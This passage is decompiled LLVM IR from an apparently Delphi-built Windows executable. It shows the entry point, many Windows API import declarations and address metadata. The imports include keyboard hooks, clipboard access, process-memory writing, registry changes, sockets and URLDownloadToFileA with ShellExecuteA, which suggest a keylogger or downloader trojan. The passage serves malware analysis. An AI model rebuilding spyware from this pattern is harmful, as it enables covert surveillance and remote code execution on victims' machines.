  %75 = inttoptr i32 %74 to i16*, !insn.addr !2143
  %76 = load i16, i16* %75, align 2, !insn.addr !2143
  %77 = trunc i32 %72 to i16, !insn.addr !2143
  call void @__asm_arpl(i16 %76, i16 %77), !insn.addr !2143
  %78 = load i8, i8* %73, align 4, !insn.addr !2144
  %79 = load i32, i32* %eax, align 4
  %80 = trunc i32 %79 to i8, !insn.addr !2144
  %81 = add i8 %78, %80, !insn.addr !2144
  %82 = inttoptr i32 %79 to i8*, !insn.addr !2144
  store i8 %81, i8* %82, align 1, !insn.addr !2144
  %83 = add i32 %71, 82, !insn.addr !2145
  %84 = inttoptr i32 %83 to i8*, !insn.addr !2145
  %85 = load i8, i8* %84, align 1, !insn.addr !2145
  %86 = add i8 %85, %63, !insn.addr !2145
  store i8 %86, i8* %84, align 1, !insn.addr !2145
  %87 = load i32, i32* %eax, align 4, !insn.addr !2146
  %88 = add i32 %87, -1, !insn.addr !2146
  %89 = add i32 %71, 4227341, !insn.addr !2147
  %90 = inttoptr i32 %89 to i8*, !insn.addr !2147
  %91 = load i8, i8* %90, align 1, !insn.addr !2147
  %92 = udiv i32 %88, 256, !insn.addr !2147
  %93 = trunc i32 %92 to i8, !insn.addr !2147
  %94 = add i8 %91, %93, !insn.addr !2147
  store i8 %94, i8* %90, align 1, !insn.addr !2147
  ret i32 %88, !insn.addr !2147

dec_label_pc_407a2d:                              ; preds = %dec_label_pc_407991
  %95 = add i32 %46, 1, !insn.addr !2148
  store i32 %95, i32* %eax, align 4, !insn.addr !2148
  %96 = inttoptr i32 %arg4 to i8*, !insn.addr !2149
  %97 = load i8, i8* %96, align 1, !insn.addr !2149
  %98 = udiv i32 %arg3, 256, !insn.addr !2149
  %99 = trunc i32 %98 to i8, !insn.addr !2149
  %100 = add i8 %97, %99, !insn.addr !2149
  store i8 %100, i8* %96, align 1, !insn.addr !2149
  %101 = add i32 %arg3, 89, !insn.addr !2150
  %102 = inttoptr i32 %101 to i8*, !insn.addr !2150
  store i8 -1, i8* %102, align 1, !insn.addr !2150
  call void @__writefsdword(i32 %95, i32 %arg3), !insn.addr !2151
  %103 = load i32, i32* %eax, align 4, !insn.addr !2152
  ret i32 %103, !insn.addr !2152

dec_label_pc_407a45:                              ; preds = %dec_label_pc_4079c4
  %104 = load i32, i32* %eax, align 4, !insn.addr !2153
  ret i32 %104, !insn.addr !2153
}

define i32 @function_407a48() local_unnamed_addr {
dec_label_pc_407a48:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096f4, align 4, !insn.addr !2154
  %2 = add i32 %1, -1, !insn.addr !2154
  store i32 %2, i32* @global_var_4096f4, align 4, !insn.addr !2154
  ret i32 %0, !insn.addr !2155
}

define i32 @function_407a50() local_unnamed_addr {
dec_label_pc_407a50:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2156
}

define i32 @SetFieldText.50() local_unnamed_addr {
dec_label_pc_407a7b:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2157
  ret i32 %0, !insn.addr !2157
}

define i32 @function_407a80() local_unnamed_addr {
dec_label_pc_407a80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2158
}

define i32 @function_407a82(i32 %arg1) local_unnamed_addr {
dec_label_pc_407a82:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2159
}

define i32 @entry_point() local_unnamed_addr {
dec_label_pc_407b7c:
  %esp.2.reg2mem = alloca i32, !insn.addr !2160
  %esp.1.reg2mem = alloca i32, !insn.addr !2160
  %esp.0.reg2mem = alloca i32, !insn.addr !2160
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-136 = alloca i8*, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %1 = call i32 @"@InitLib"(i32 %0), !insn.addr !2161
  %2 = call i32 @__readfsdword(i32 0), !insn.addr !2162
  store i32 %2, i32* %stack_var_-116, align 4, !insn.addr !2162
  %3 = ptrtoint i32* %stack_var_-116 to i32, !insn.addr !2162
  call void @__writefsdword(i32 0, i32 %3), !insn.addr !2163
  store i32 0, i32* %stack_var_-128, align 4, !insn.addr !2164
  %4 = call i32 @GetModuleFileNameA(i32* inttoptr (i32 260 to i32*), i8* bitcast (i8** @global_var_4096f8 to i8*), i32 0), !insn.addr !2165
  %5 = add i32 %4, ptrtoint (i8** @global_var_4096f8 to i32), !insn.addr !2166
  %6 = inttoptr i32 %5 to i8*, !insn.addr !2166
  store i8 0, i8* %6, align 1, !insn.addr !2166
  %7 = call i32 @"@LStrFromArray"(), !insn.addr !2167
  %8 = call i32 @function_407008(), !insn.addr !2168
  %9 = call i32 @"@LStrAsg"(), !insn.addr !2169
  %10 = call i32 @function_407080(), !insn.addr !2170
  %11 = trunc i32 %10 to i8, !insn.addr !2171
  %12 = icmp eq i8 %11, 0, !insn.addr !2171
  br i1 %12, label %dec_label_pc_407c83, label %dec_label_pc_407c08, !insn.addr !2172

dec_label_pc_407c08:                              ; preds = %dec_label_pc_407b7c
  %13 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2173
  %14 = inttoptr i32 %13 to i32*, !insn.addr !2174
  store i32 -1, i32* %14, align 4, !insn.addr !2174
  %15 = call i32 @"@LStrFromArray"(), !insn.addr !2175
  %16 = call i32 @function_407048(), !insn.addr !2176
  %17 = call i32 @"@LStrAsg"(), !insn.addr !2177
  %18 = call i32 @"@LStrCat3"(), !insn.addr !2178
  %19 = call i32 @function_4036c8(), !insn.addr !2179
  %20 = inttoptr i32 %19 to i8*, !insn.addr !2180
  %21 = call i1 @DeleteFileA(i8* %20), !insn.addr !2181
  %22 = call i32 @"@LStrCat3"(), !insn.addr !2182
  %23 = call i32 @function_4036c8(), !insn.addr !2183
  %24 = inttoptr i32 %23 to i8*, !insn.addr !2184
  store i8* %24, i8** %stack_var_-136, align 4, !insn.addr !2184
  %25 = ptrtoint i8** %stack_var_-136 to i32, !insn.addr !2184
  %26 = call i32* @LoadLibraryA(i8* %24), !insn.addr !2185
  %27 = ptrtoint i32* %26 to i32, !insn.addr !2185
  store i32 %27, i32* @global_var_408118, align 4, !insn.addr !2186
  store i32 %25, i32* %esp.0.reg2mem, !insn.addr !2187
  br label %dec_label_pc_407cb0, !insn.addr !2187

dec_label_pc_407c83:                              ; preds = %dec_label_pc_407b7c
  %28 = ptrtoint i32* %stack_var_-128 to i32, !insn.addr !2164
  %29 = call i32 @function_4060f0(), !insn.addr !2188
  %30 = call i32 @function_407080(), !insn.addr !2189
  %31 = trunc i32 %30 to i8, !insn.addr !2190
  %32 = icmp eq i8 %31, 0, !insn.addr !2190
  store i32 %28, i32* %esp.2.reg2mem, !insn.addr !2191
  br i1 %32, label %dec_label_pc_407df2, label %dec_label_pc_407ca5, !insn.addr !2191

dec_label_pc_407ca5:                              ; preds = %dec_label_pc_407c83
  %33 = load i32, i32* @global_var_408138, align 4, !insn.addr !2192
  %34 = inttoptr i32 %33 to i32*, !insn.addr !2193
  store i32 -1, i32* %34, align 4, !insn.addr !2193
  store i32 %28, i32* %esp.0.reg2mem, !insn.addr !2193
  br label %dec_label_pc_407cb0, !insn.addr !2193

dec_label_pc_407cb0:                              ; preds = %dec_label_pc_407ca5, %dec_label_pc_407c08
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %35 = add i32 %esp.0.reload, -4, !insn.addr !2194
  %36 = inttoptr i32 %35 to i32*, !insn.addr !2194
  store i32 260, i32* %36, align 4, !insn.addr !2194
  %37 = add i32 %esp.0.reload, -8, !insn.addr !2195
  %38 = inttoptr i32 %37 to i32*, !insn.addr !2195
  store i32 ptrtoint (i8** @global_var_4096f8 to i32), i32* %38, align 4, !insn.addr !2195
  %39 = load i32 (i32, i32, i32)*, i32 (i32, i32, i32)** @global_var_409650, align 4, !insn.addr !2196
  %40 = ptrtoint i32 (i32, i32, i32)* %39 to i32, !insn.addr !2196
  %41 = add i32 %esp.0.reload, -12, !insn.addr !2197
  %42 = inttoptr i32 %41 to i32*, !insn.addr !2197
  store i32 %40, i32* %42, align 4, !insn.addr !2197
  %43 = call i32 @GetModuleFileNameA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !2198
  %44 = add i32 %43, ptrtoint (i8** @global_var_4096f8 to i32), !insn.addr !2199
  %45 = inttoptr i32 %44 to i8*, !insn.addr !2199
  store i8 0, i8* %45, align 1, !insn.addr !2199
  %46 = call i32 @"@LStrFromArray"(), !insn.addr !2200
  %47 = call i32 @function_407048(), !insn.addr !2201
  %48 = call i32 @"@LStrAsg"(), !insn.addr !2202
  %49 = call i32 @"@LStrCat3"(), !insn.addr !2203
  %50 = load i32, i32* @global_var_408138, align 4, !insn.addr !2204
  %51 = icmp eq i32 %50, 0, !insn.addr !2204
  br i1 %51, label %dec_label_pc_407d49, label %dec_label_pc_407d16, !insn.addr !2205

dec_label_pc_407d16:                              ; preds = %dec_label_pc_407cb0
  %52 = add i32 %esp.0.reload, -16, !insn.addr !2206
  %53 = inttoptr i32 %52 to i32*, !insn.addr !2206
  store i32 ptrtoint ([16 x i8]* @global_var_407e74 to i32), i32* %53, align 4, !insn.addr !2206
  %54 = add i32 %esp.0.reload, -20, !insn.addr !2207
  %55 = inttoptr i32 %54 to i32*, !insn.addr !2207
  store i32 ptrtoint ([8 x i8]* @global_var_407e84 to i32), i32* %55, align 4, !insn.addr !2207
  %56 = call i32* @FindWindowA(i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2208
  %57 = icmp eq i32* %56, null, !insn.addr !2209
  %58 = icmp eq i1 %57, false, !insn.addr !2210
  store i32 %54, i32* %esp.2.reg2mem, !insn.addr !2210
  br i1 %58, label %dec_label_pc_407df2, label %dec_label_pc_407d2d, !insn.addr !2210

dec_label_pc_407d2d:                              ; preds = %dec_label_pc_407d16
  %59 = add i32 %esp.0.reload, -24, !insn.addr !2211
  %60 = inttoptr i32 %59 to i32*, !insn.addr !2211
  store i32 ptrtoint (i32* @global_var_409808 to i32), i32* %60, align 4, !insn.addr !2211
  %61 = add i32 %esp.0.reload, -28, !insn.addr !2212
  %62 = inttoptr i32 %61 to i32*, !insn.addr !2212
  store i32 0, i32* %62, align 4, !insn.addr !2212
  %63 = add i32 %esp.0.reload, -32, !insn.addr !2213
  %64 = inttoptr i32 %63 to i32*, !insn.addr !2213
  store i32 66, i32* %64, align 4, !insn.addr !2213
  %65 = add i32 %esp.0.reload, -36, !insn.addr !2214
  %66 = inttoptr i32 %65 to i32*, !insn.addr !2214
  store i32 4220648, i32* %66, align 4, !insn.addr !2214
  %67 = add i32 %esp.0.reload, -40, !insn.addr !2215
  %68 = inttoptr i32 %67 to i32*, !insn.addr !2215
  store i32 0, i32* %68, align 4, !insn.addr !2215
  %69 = add i32 %esp.0.reload, -44, !insn.addr !2216
  %70 = inttoptr i32 %69 to i32*, !insn.addr !2216
  store i32 0, i32* %70, align 4, !insn.addr !2216
  %71 = call i32* @CreateThread(%_SECURITY_ATTRIBUTES* bitcast (i32* @0 to %_SECURITY_ATTRIBUTES*), i32 ptrtoint (i32* @0 to i32), i32 (i32*)* bitcast (i32* @0 to i32 (i32*)*), i32* nonnull @0, i32 ptrtoint (i32* @0 to i32), i32* nonnull @0), !insn.addr !2217
  store i32 %69, i32* %esp.2.reg2mem, !insn.addr !2218
  br label %dec_label_pc_407df2, !insn.addr !2218

dec_label_pc_407d49:                              ; preds = %dec_label_pc_407cb0
  %72 = load i32, i32* @global_var_40812c, align 4, !insn.addr !2219
  %73 = icmp eq i32 %72, 0, !insn.addr !2219
  store i32 %41, i32* %esp.2.reg2mem, !insn.addr !2220
  br i1 %73, label %dec_label_pc_407df2, label %dec_label_pc_407d57, !insn.addr !2220

dec_label_pc_407d57:                              ; preds = %dec_label_pc_407d49
  %74 = load i8, i8* bitcast (i32** @global_var_408160 to i8*), align 4, !insn.addr !2221
  %75 = icmp eq i8 %74, 0, !insn.addr !2221
  br i1 %75, label %dec_label_pc_407d66, label %dec_label_pc_407d61, !insn.addr !2222

dec_label_pc_407d61:                              ; preds = %dec_label_pc_407d57
  %76 = call i32 @function_4068a8(), !insn.addr !2223
  br label %dec_label_pc_407d66, !insn.addr !2223

dec_label_pc_407d66:                              ; preds = %dec_label_pc_407d61, %dec_label_pc_407d57
  %77 = load i32, i32* @global_var_408148, align 4, !insn.addr !2224
  %78 = icmp slt i32 %77, 1, !insn.addr !2225
  br i1 %78, label %dec_label_pc_407da3, label %dec_label_pc_407d70, !insn.addr !2225

dec_label_pc_407d70:                              ; preds = %dec_label_pc_407d66
  %79 = call i32 @function_404d38(), !insn.addr !2226
  %80 = call i32 @"@LStrCmp"(), !insn.addr !2227
  %81 = load i32, i32* @global_var_408154, align 4, !insn.addr !2228
  %82 = inttoptr i32 %81 to i32*, !insn.addr !2229
  store i32 -1, i32* %82, align 4, !insn.addr !2229
  %83 = load i32, i32* @global_var_408154, align 4, !insn.addr !2230
  %84 = icmp eq i32 %83, 0, !insn.addr !2230
  br i1 %84, label %dec_label_pc_407da3, label %dec_label_pc_407d9e, !insn.addr !2231

dec_label_pc_407d9e:                              ; preds = %dec_label_pc_407d70
  %85 = call i32 @function_40600c(), !insn.addr !2232
  br label %dec_label_pc_407da3, !insn.addr !2232

dec_label_pc_407da3:                              ; preds = %dec_label_pc_407d9e, %dec_label_pc_407d70, %dec_label_pc_407d66
  %86 = add i32 %esp.0.reload, -16, !insn.addr !2233
  %87 = inttoptr i32 %86 to i32*, !insn.addr !2233
  store i32 3, i32* %87, align 4, !insn.addr !2233
  %88 = add i32 %esp.0.reload, -20, !insn.addr !2234
  %89 = inttoptr i32 %88 to i32*, !insn.addr !2234
  store i32 16065, i32* %89, align 4, !insn.addr !2234
  %90 = load i32, i32* @global_var_408118, align 4, !insn.addr !2235
  %91 = add i32 %esp.0.reload, -24, !insn.addr !2236
  %92 = inttoptr i32 %91 to i32*, !insn.addr !2236
  store i32 %90, i32* %92, align 4, !insn.addr !2236
  %93 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2237
  %94 = icmp eq i32* %93, null, !insn.addr !2238
  %95 = icmp eq i1 %94, false, !insn.addr !2239
  store i32 %91, i32* %esp.1.reg2mem, !insn.addr !2239
  br i1 %95, label %dec_label_pc_407de3, label %dec_label_pc_407db9, !insn.addr !2239

dec_label_pc_407db9:                              ; preds = %dec_label_pc_407da3
  %96 = add i32 %esp.0.reload, -28, !insn.addr !2240
  %97 = inttoptr i32 %96 to i32*, !insn.addr !2240
  store i32 14, i32* %97, align 4, !insn.addr !2240
  %98 = add i32 %esp.0.reload, -32, !insn.addr !2241
  %99 = inttoptr i32 %98 to i32*, !insn.addr !2241
  store i32 16065, i32* %99, align 4, !insn.addr !2241
  %100 = load i32, i32* @global_var_408118, align 4, !insn.addr !2242
  %101 = add i32 %esp.0.reload, -36, !insn.addr !2243
  %102 = inttoptr i32 %101 to i32*, !insn.addr !2243
  store i32 %100, i32* %102, align 4, !insn.addr !2243
  %103 = call i32* @FindResourceA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*), i8* bitcast (i32* @0 to i8*)), !insn.addr !2244
  %104 = icmp eq i32* %103, null, !insn.addr !2245
  %105 = icmp eq i1 %104, false, !insn.addr !2246
  store i32 %101, i32* %esp.1.reg2mem, !insn.addr !2246
  br i1 %105, label %dec_label_pc_407de3, label %dec_label_pc_407dcf, !insn.addr !2246

dec_label_pc_407dcf:                              ; preds = %dec_label_pc_407db9
  %106 = add i32 %esp.0.reload, -40, !insn.addr !2247
  %107 = inttoptr i32 %106 to i32*, !insn.addr !2247
  store i32 16065, i32* %107, align 4, !insn.addr !2247
  %108 = load i32, i32* @global_var_408118, align 4, !insn.addr !2248
  %109 = add i32 %esp.0.reload, -44, !insn.addr !2249
  %110 = inttoptr i32 %109 to i32*, !insn.addr !2249
  store i32 %108, i32* %110, align 4, !insn.addr !2249
  %111 = call i32* @LoadIconA(i32* nonnull @0, i8* bitcast (i32* @0 to i8*)), !insn.addr !2250
  %112 = icmp eq i32* %111, null, !insn.addr !2251
  store i32 %109, i32* %esp.1.reg2mem, !insn.addr !2252
  store i32 %109, i32* %esp.2.reg2mem, !insn.addr !2252
  br i1 %112, label %dec_label_pc_407df2, label %dec_label_pc_407de3, !insn.addr !2252

dec_label_pc_407de3:                              ; preds = %dec_label_pc_407dcf, %dec_label_pc_407db9, %dec_label_pc_407da3
  %esp.1.reload = load i32, i32* %esp.1.reg2mem
  %113 = call i32 @function_40791c(), !insn.addr !2253
  store i32 4225616, i32* @global_var_409654, align 4, !insn.addr !2254
  store i32 %esp.1.reload, i32* %esp.2.reg2mem, !insn.addr !2254
  br label %dec_label_pc_407df2, !insn.addr !2254

dec_label_pc_407df2:                              ; preds = %dec_label_pc_407de3, %dec_label_pc_407dcf, %dec_label_pc_407d49, %dec_label_pc_407d2d, %dec_label_pc_407d16, %dec_label_pc_407c83
  %esp.2.reload = load i32, i32* %esp.2.reg2mem
  %114 = inttoptr i32 %esp.2.reload to i32*, !insn.addr !2255
  %115 = load i32, i32* %114, align 4, !insn.addr !2255
  call void @__writefsdword(i32 0, i32 %115), !insn.addr !2256
  %116 = add i32 %esp.2.reload, 8, !insn.addr !2257
  %117 = inttoptr i32 %116 to i32*, !insn.addr !2257
  store i32 4226580, i32* %117, align 4, !insn.addr !2257
  %118 = call i32 @"@LStrArrayClr"(), !insn.addr !2258
  ret i32 %118, !insn.addr !2259
}

define i32 @function_407e0d() local_unnamed_addr {
dec_label_pc_407e0d:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !2260
  ret i32 %0, !insn.addr !2260
}

define i32 @function_407e12() local_unnamed_addr {
dec_label_pc_407e12:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !2261
}

declare void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @EnterCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION*) local_unnamed_addr

declare i1 @VirtualFree(i32*, i32, i32) local_unnamed_addr

declare i32* @VirtualAlloc(i32*, i32, i32, i32) local_unnamed_addr

declare i32* @LocalFree(i32*) local_unnamed_addr

declare i32* @LocalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount() local_unnamed_addr

declare i1 @QueryPerformanceCounter(%_LARGE_INTEGER*) local_unnamed_addr

declare i32 @GetVersion() local_unnamed_addr

declare i32 @GetCurrentThreadId() local_unnamed_addr

declare i32 @GetThreadLocale() local_unnamed_addr

declare void @GetStartupInfoA(%_STARTUPINFOA*) local_unnamed_addr

declare i32 @GetLocaleInfoA(i32, i32, i8*, i32) local_unnamed_addr

declare i8* @GetCommandLineA() local_unnamed_addr

declare i1 @FreeLibrary(i32*) local_unnamed_addr

declare void @ExitProcess(i32) local_unnamed_addr

declare i1 @WriteFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS*) local_unnamed_addr

declare void @RtlUnwind(i32*, i32*, %_EXCEPTION_RECORD*, i32*) local_unnamed_addr

declare void @RaiseException(i32, i32, i32, i32*) local_unnamed_addr

declare i32* @GetStdHandle(i32) local_unnamed_addr

declare i32 @GetKeyboardType(i32) local_unnamed_addr

declare i32 @MessageBoxA(i32*, i8*, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA(i32*, i8*, i32*, i32*, i8*, i32*) local_unnamed_addr

declare i32 @RegOpenKeyExA(i32*, i8*, i32, i32, i32**) local_unnamed_addr

declare i32 @RegCloseKey(i32*) local_unnamed_addr

declare void @SysFreeString(i16*) local_unnamed_addr

declare i32 @SysReAllocStringLen(i16**, i16*, i32) local_unnamed_addr

declare i1 @TlsSetValue(i32, i32*) local_unnamed_addr

declare i32* @TlsGetValue(i32) local_unnamed_addr

declare i1 @TlsFree(i32) local_unnamed_addr

declare i32 @TlsAlloc() local_unnamed_addr

declare i32 @LocalFree.2() local_unnamed_addr

declare i32 @LocalAlloc.3() local_unnamed_addr

declare i32 @RegSetValueExA(i32*, i8*, i32, i32, i8*, i32) local_unnamed_addr

declare i32 @RegQueryValueExA.4() local_unnamed_addr

declare i32 @RegOpenKeyExA.5() local_unnamed_addr

declare i32 @RegDeleteKeyA(i32*, i8*) local_unnamed_addr

declare i32 @RegCreateKeyExA(i32*, i8*, i32, i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32**, i32*) local_unnamed_addr

declare i32 @RegCloseKey.6() local_unnamed_addr

declare i8* @lstrcpyA(i8*, i8*) local_unnamed_addr

declare i32 @lstrcmpiA(i8*, i8*) local_unnamed_addr

declare i1 @WriteProcessMemory(i32*, i32*, i32*, i32, i32*) local_unnamed_addr

declare i32 @WriteFile.7() local_unnamed_addr

declare i1 @VirtualProtect(i32*, i32, i32, i32*) local_unnamed_addr

declare void @Sleep(i32) local_unnamed_addr

declare i1 @SetEndOfFile(i32*) local_unnamed_addr

declare i1 @ReadFile(i32*, i32*, i32, i32*, %_OVERLAPPED*) local_unnamed_addr

declare i32* @LoadLibraryA(i8*) local_unnamed_addr

declare i1 @GlobalUnlock(i32*) local_unnamed_addr

declare i32* @GlobalLock(i32*) local_unnamed_addr

declare i32* @GlobalFree(i32*) local_unnamed_addr

declare i32* @GlobalAlloc(i32, i32) local_unnamed_addr

declare i32 @GetTickCount.8() local_unnamed_addr

declare i32 @GetTempPathA(i32, i8*) local_unnamed_addr

declare i32 ()* @GetProcAddress(i32*, i8*) local_unnamed_addr

declare i32* @GetModuleHandleA(i8*) local_unnamed_addr

declare i32 @GetModuleFileNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetFileSize(i32*, i32*) local_unnamed_addr

declare i32* @GetCurrentProcess() local_unnamed_addr

declare void @FreeLibraryAndExitThread(i32*, i32) local_unnamed_addr

declare i32* @FindResourceA(i32*, i8*, i8*) local_unnamed_addr

declare i32 @ExitProcess.9() local_unnamed_addr

declare i1 @DeleteFileA(i8*) local_unnamed_addr

declare i32* @CreateThread(%_SECURITY_ATTRIBUTES*, i32, i32 (i32*)*, i32*, i32, i32*) local_unnamed_addr

declare i32* @CreateFileA(i8*, i32, i32, %_SECURITY_ATTRIBUTES*, i32, i32, i32*) local_unnamed_addr

declare i1 @CopyFileA(i8*, i8*, i1) local_unnamed_addr

declare i32 @CompareStringA(i32, i32, i8*, i32, i8*, i32) local_unnamed_addr

declare i1 @CloseHandle(i32*) local_unnamed_addr

declare i32* @SelectObject(i32*, i32*) local_unnamed_addr

declare i32* @GetStockObject(i32) local_unnamed_addr

declare i1 @GetCharWidthA(i32*, i32, i32, i32*) local_unnamed_addr

declare i32 @CreateWindowExA.10() local_unnamed_addr

declare i1 @UnhookWindowsHookEx(i32*) local_unnamed_addr

declare i32 @ToAscii(i32, i32, i8*, i16*, i32) local_unnamed_addr

declare i32* @SetWindowsHookExA(i32, i32 (i32, i32, i32)*, i32*, i32) local_unnamed_addr

declare i32 @SetWindowLongA(i32*, i32, i32) local_unnamed_addr

declare i32 @SetTimer(i32*, i32, i32, void (i32*, i32, i32, i32)*) local_unnamed_addr

declare i32 @SendMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @ReleaseDC(i32*, i32*) local_unnamed_addr

declare void @PostQuitMessage(i32) local_unnamed_addr

declare i1 @PostMessageA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @OpenClipboard(i32*) local_unnamed_addr

declare i32* @LoadIconA(i32*, i8*) local_unnamed_addr

declare i1 @KillTimer(i32*, i32) local_unnamed_addr

declare i1 @IsWindowVisible(i32*) local_unnamed_addr

declare i1 @IsWindow(i32*) local_unnamed_addr

declare i32 @GetWindowThreadProcessId(i32*, i32*) local_unnamed_addr

declare i32 @GetWindowLongA(i32*, i32) local_unnamed_addr

declare i32* @GetTopWindow(i32*) local_unnamed_addr

declare i32* @GetParent(i32*) local_unnamed_addr

declare i32* @GetWindow(i32*, i32) local_unnamed_addr

declare i1 @GetMessageA(%tagMSG*, i32*, i32, i32) local_unnamed_addr

declare i1 @GetKeyboardState(i8*) local_unnamed_addr

declare i32* @GetDC(i32*) local_unnamed_addr

declare i32* @GetClipboardData(i32) local_unnamed_addr

declare i32 @GetClassNameA(i32*, i8*, i32) local_unnamed_addr

declare i32 @GetClassLongA(i32*, i32) local_unnamed_addr

declare i1 @GetCaretPos(%tagPOINT*) local_unnamed_addr

declare i32* @FindWindowExA(i32*, i32*, i8*, i8*) local_unnamed_addr

declare i32* @FindWindowA(i8*, i8*) local_unnamed_addr

declare i1 @EnumWindows(i1 (i32*, i32)*, i32) local_unnamed_addr

declare i32 @DispatchMessageA(%tagMSG*) local_unnamed_addr

declare i32 @DefWindowProcA(i32*, i32, i32, i32) local_unnamed_addr

declare i1 @CloseClipboard() local_unnamed_addr

declare i32 @CallNextHookEx(i32*, i32, i32, i32) local_unnamed_addr

declare i32 @WSACleanup() local_unnamed_addr

declare i32 @WSAStartup(i16, %WSAData*) local_unnamed_addr

declare i32 @gethostname(i8*, i32) local_unnamed_addr

declare %hostent* @gethostbyname(i8*) local_unnamed_addr

declare i32 @socket(i32, i32, i32) local_unnamed_addr

declare i32 @send(i32, i8*, i32, i32) local_unnamed_addr

declare i32 @recv(i32, i8*, i32, i32) local_unnamed_addr

declare i8* @inet_ntoa(%in_addr) local_unnamed_addr

declare i16 @htons(i16) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @closesocket(i32) local_unnamed_addr

declare i32* @ShellExecuteA(i32*, i8*, i8*, i8*, i8*, i32) local_unnamed_addr

declare i32 @URLDownloadToFileA(i32*, i8*, i8*, i32, i32*) local_unnamed_addr

declare i32 @URLDownloadToFileA.11() local_unnamed_addr

declare i1 @PathFileExistsA(i8*) local_unnamed_addr

declare i32* @ImageDirectoryEntryToData(i32*, i8, i16, i32*) local_unnamed_addr

; Function Attrs: nounwind readnone speculatable
declare i8 @llvm.ctpop.i8(i8) #0

declare i8 @__asm_in(i16) local_unnamed_addr

declare i32 @__asm_bound(i64) local_unnamed_addr

declare i32 @__asm_insd(i16) local_unnamed_addr

declare void @__asm_outsd(i16, i32) local_unnamed_addr

declare void @__asm_outsb(i16, i8) local_unnamed_addr

declare i32 @__asm_iretd() local_unnamed_addr

declare void @__asm_out(i32, i32) local_unnamed_addr

declare i8 @__asm_insb(i16) local_unnamed_addr

declare void @__asm_arpl(i16, i16) local_unnamed_addr

declare i32 @__readfsdword(i32) local_unnamed_addr

declare void @__writefsdword(i32, i32) local_unnamed_addr

declare i8 @__readgsbyte(i32) local_unnamed_addr

declare void @__writegsbyte(i32, i8) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i1 @__decompiler_undefined_function_1() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { nounwind readnone speculatable }

!0 = !{i64 4198496}
!1 = !{i64 4198504}
!2 = !{i64 4198512}
!3 = !{i64 4198520}
!4 = !{i64 4198528}
!5 = !{i64 4198536}
!6 = !{i64 4198544}
!7 = !{i64 4198552}
!8 = !{i64 4198560}
!9 = !{i64 4198568}
!10 = !{i64 4198576}
!11 = !{i64 4198584}
!12 = !{i64 4198592}
!13 = !{i64 4198600}
!14 = !{i64 4198608}
!15 = !{i64 4198616}
!16 = !{i64 4198624}
!17 = !{i64 4198632}
!18 = !{i64 4198640}
!19 = !{i64 4198648}
!20 = !{i64 4198656}
!21 = !{i64 4198700}
!22 = !{i64 4198708}
!23 = !{i64 4198716}
!24 = !{i64 4198724}
!25 = !{i64 4198732}
!26 = !{i64 4198740}
!27 = !{i64 4198748}
!28 = !{i64 4198756}
!29 = !{i64 4200622}
!30 = !{i64 4200627}
!31 = !{i64 4200629}
!32 = !{i64 4200635}
!33 = !{i64 4202592}
!34 = !{i64 4202597}
!35 = !{i64 4202599}
!36 = !{i64 4202608}
!37 = !{i64 4203014}
!38 = !{i64 4203019}
!39 = !{i64 4203021}
!40 = !{i64 4203029}
!41 = !{i64 4203685}
!42 = !{i64 4203690}
!43 = !{i64 4203692}
!44 = !{i64 4203700}
!45 = !{i64 4203859}
!46 = !{i64 4203933}
!47 = !{i64 4203947}
!48 = !{i64 4204720}
!49 = !{i64 4205241}
!50 = !{i64 4205244}
!51 = !{i64 4205248}
!52 = !{i64 4205252}
!53 = !{i64 4205294}
!54 = !{i64 4205337}
!55 = !{i64 4205346}
!56 = !{i64 4205349}
!57 = !{i64 4205351}
!58 = !{i64 4205362}
!59 = !{i64 4205367}
!60 = !{i64 4205372}
!61 = !{i64 4205397}
!62 = !{i64 4206143}
!63 = !{i64 4206165}
!64 = !{i64 4206325}
!65 = !{i64 4206951}
!66 = !{i64 4207089}
!67 = !{i64 4207447}
!68 = !{i64 4207453}
!69 = !{i64 4207458}
!70 = !{i64 4207471}
!71 = !{i64 4207776}
!72 = !{i64 4207790}
!73 = !{i64 4207815}
!74 = !{i64 4207816}
!75 = !{i64 4207818}
!76 = !{i64 4207820}
!77 = !{i64 4207823}
!78 = !{i64 4208007}
!79 = !{i64 4208145}
!80 = !{i64 4208312}
!81 = !{i64 4208314}
!82 = !{i64 4208316}
!83 = !{i64 4208319}
!84 = !{i64 4208320}
!85 = !{i64 4208322}
!86 = !{i64 4208326}
!87 = !{i64 4208328}
!88 = !{i64 4208332}
!89 = !{i64 4208408}
